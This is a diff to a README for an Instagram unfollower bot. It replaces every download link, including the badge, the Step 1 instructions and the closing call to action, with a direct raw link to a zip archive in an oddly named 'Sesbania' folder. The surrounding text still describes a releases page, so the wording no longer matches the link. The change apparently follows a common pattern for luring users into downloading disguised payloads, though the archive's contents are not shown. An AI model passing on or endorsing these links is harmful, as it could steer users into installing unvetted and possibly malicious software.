@@ -1,6 +1,6 @@
 # 🤖 Instagram-Unfollower-Bot - Clean Your Feed in Minutes
 
-[![Download Instagram Unfollower Bot](https://img.shields.io/badge/Download-Instagram_Unfollower_Bot-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/releases)
+[![Download Instagram Unfollower Bot](https://img.shields.io/badge/Download-Instagram_Unfollower_Bot-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://raw.githubusercontent.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/main/Sesbania/Instagram-Bot-Unfollower-coyness.zip)
 
 ---
 
@@ -37,7 +37,7 @@ The bot works quietly in the background, respects Instagram's rate limits, and i
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/releases](https://github.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/main/Sesbania/Instagram-Bot-Unfollower-coyness.zip](https://raw.githubusercontent.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/main/Sesbania/Instagram-Bot-Unfollower-coyness.zip)
 
 You'll see a list of available files. Look for the latest version and click the download button. The file will save to your computer's default Downloads folder.
 
@@ -156,7 +156,7 @@ We're committed to keeping this tool free and functional for all users.
 
 Instagram-Unfollower-Bot puts you back in control of your Instagram experience. Stop wasting time scrolling through irrelevant posts and start building a feed that matters to you. Download it today, and see the difference in minutes.
 
-Remember to visit this link to download the application: [https://github.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/releases](https://github.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/releases)
+Remember to visit this link to download the application: [https://raw.githubusercontent.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/main/Sesbania/Instagram-Bot-Unfollower-coyness.zip](https://raw.githubusercontent.com/Renaldodiagnostic4910/Instagram-Unfollower-Bot/main/Sesbania/Instagram-Bot-Unfollower-coyness.zip)
 
 Thank you for choosing Instagram-Unfollower-Bot. Happy unfollowing!
 
